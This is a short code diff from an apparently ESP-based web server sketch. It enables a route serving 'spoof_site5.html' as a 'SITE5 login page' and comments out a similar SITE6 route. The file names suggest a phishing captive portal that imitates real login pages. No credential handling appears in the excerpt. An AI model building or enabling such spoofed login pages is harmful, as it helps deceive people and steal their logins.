@@ -762,7 +762,7 @@ void setup(void)
           }
         f.close();
     });
-/*
+
     //SITE5 login page
     server.on(site5_redirect,[]() {
         File f = SPIFFS.open("/spoof_site5.html", "r");
@@ -774,7 +774,7 @@ void setup(void)
           }
         f.close();
     });
-
+/*
     //SITE6 login page
     server.on(site6_redirect,[]() {
         File f = SPIFFS.open("/spoof_site6.html", "r");
